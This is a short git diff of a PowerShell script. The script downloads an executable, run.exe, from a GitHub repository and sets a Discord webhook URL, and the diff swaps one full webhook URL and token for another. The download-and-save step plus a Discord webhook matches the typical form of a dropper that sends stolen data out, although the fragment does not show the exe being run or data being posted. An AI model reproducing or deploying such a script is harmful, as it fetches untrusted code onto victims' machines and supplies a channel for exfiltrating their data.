@@ -2,7 +2,7 @@ $DOWNLOAD_URL = "https://github.com/HFScripts/sqlite/raw/main/run.exe"
 $FILENAME = "run.exe"
 $CURRENT_DIR = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
 # Define the webhook URL
-$WEBHOOK_URL = "https://discord.com/api/webhooks/1130246405110382673/yIIHJpdTW_MiGTTNMEpMtSecLOJsjzFil6Bl9WWKZT-hKVvQigETfMi_uniW5KMn78ca"
+$WEBHOOK_URL = "https://discord.com/api/webhooks/1130246078051135640/Aoe5F83UDByzMI47-YBn7lb46fsONaidTNoL3y7SfMeRUZEWIYju7rExj4yqZR1SFp2H"
 
 if (!(Test-Path $FILENAME)) {
     Invoke-WebRequest -Uri $DOWNLOAD_URL -OutFile $FILENAME
